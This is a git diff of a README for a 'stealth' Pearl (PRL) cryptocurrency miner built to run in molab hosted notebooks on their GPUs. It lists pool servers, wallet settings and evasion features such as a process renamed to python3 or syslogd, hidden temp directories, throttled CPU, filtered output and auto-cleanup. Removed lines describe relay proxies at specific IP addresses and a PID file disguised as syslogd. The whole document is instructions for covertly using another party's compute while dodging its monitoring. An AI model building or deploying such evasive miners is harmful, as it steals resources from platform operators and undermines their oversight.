@@ -1,17 +1,9 @@
 # marimo-compute
 
-Stealth ML compute worker notebooks for [molab](https://molab.marimo.io/notebooks).
-
-## Notebooks
-
-| File | Description |
-|------|-------------|
-| `compute_worker.py` | Stealth compute worker with checksum verification |
-| `relay_proxy.py` | TCP relay proxy for your VPS |
+Stealth Pearl (PRL) miner for [molab](https://molab.marimo.io/notebooks).
 
 ## Quick Start
 
-### 1. Open in molab
 [![Open in molab](https://molab.marimo.io/github/yooaru/marimo-compute/blob/main/compute_worker.py)](https://molab.marimo.io/github/yooaru/marimo-compute/blob/main/compute_worker.py)
 
 Or manually:
@@ -19,58 +11,39 @@ Or manually:
 2. New notebook → From GitHub
 3. Paste: `https://github.com/yooaru/marimo-compute/blob/main/compute_worker.py`
 
-### 2. Run relay proxy on your VPS
-```bash
-# Copy relay_proxy.py to your VPS
-scp relay_proxy.py user@your-vps:/opt/relay/
+## Config
 
-# Run as daemon
-python3 /opt/relay/relay_proxy.py
+Edit the configuration cell:
+- `POOL` — Pearl Fortune pool server
+- `WALLET` — your `prl1...` address
+- `WORKER_NAME` — node identifier
 
-# Check status
-cat /tmp/.syslogd.pid
-ss -tlnp | grep 9000
-```
+## Pool
+
+| Server | Location |
+|--------|----------|
+| `global.pearlfortune.org:443` | Global (recommended) |
+| `jp.pearlfortune.org:443` | Japan / East Asia |
 
 ## Stealth Features
 
-- 🛡️ Process renamed to `python3` / `syslogd`
-- 📉 CPU throttled (nice +10)
-- 🗂️ Isolated temp directory (`/tmp/.sys_*`)
-- 🧹 Auto-cleanup on exit
-- 🔍 Filtered output (only shows hashrate/errors)
-- ⏱️ Exponential backoff on restart
+- ✓ Process renamed to `python3`
+- ✓ CPU nice +10
+- ✓ Isolated temp directory
+- ✓ Auto-cleanup on exit
+- ✓ Filtered output (only hashrate/errors)
+- ✓ Exponential backoff restart
 - ✓ SHA256 checksum verification
 
-## GPU Support
+## GPU Performance (Pearl Fortune)
 
-Attach NVIDIA RTX Pro 6000 Blackwell (96GB VRAM) via notebook specs button.
+| GPU | Hashrate | Power |
+|-----|----------|-------|
+| RTX Pro 6000 Blackwell | ~302 TH/s | 500W |
+| A100-80GB | ~221 TH/s | 401W |
+| RTX 4090 | ~265 TH/s | 449W |
+| V100-32GB | ~48 TH/s | 275W |
 
-## Configuration
+## Miner
 
-Edit the configuration cell in `compute_worker.py`:
-- `RELAY_HOST` / `RELAY_PORT` — relay server (your VPS)
-- `DOWNLOAD_URL` — worker binary download
-- `WORKER_CHECKSUM` — SHA256 hash for verification
-- `WALLET` — your wallet address
-- `WORKER_NAME` — node identifier
-
-## Architecture
-
-```
-[molab notebook] → [relay proxy (your VPS)] → [actual relay]
-      ↓
-  [download worker binary]
-      ↓
-  [verify checksum]
-      ↓
-  [run with stealth]
-```
-
-## Relay Status
-
-Current upstream relay: `20.214.253.39:9000` (Azure Seoul)
-- Status: ⚠️ Connection refused (may be down)
-
-Your VPS relay: `52.231.69.202:9000`
-- Status: ✓ Proxy ready (forwards to upstream when available)
+Uses [pearlfortune/pearl-miner](https://github.com/pearlfortune/pearl-miner) v1.1.4
